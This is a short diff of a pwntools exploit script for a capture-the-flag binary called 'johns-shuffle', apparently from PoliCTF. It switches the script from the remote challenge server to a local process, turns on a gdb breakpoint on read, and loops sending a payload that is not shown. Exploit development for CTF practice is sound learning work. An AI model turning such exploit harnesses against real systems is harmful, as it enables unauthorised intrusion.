@@ -27,15 +27,14 @@ log.info("Waiting on the randomization to work")
 while True:
     try:
         # r = process('./johns-shuffle')
-        with remote('shuffle.polictf.it', 80) as r:
+        # with remote('shuffle.polictf.it', 80) as r:
+        with process('./johns-shuffle') as r:
 
             # Debug code
-            '''
             gdb.attach(r, """
             bp {}
             c
             """.format(hex(elf.symbols['read'])))
-            '''
 
             # PWN
             r.sendline(payload)
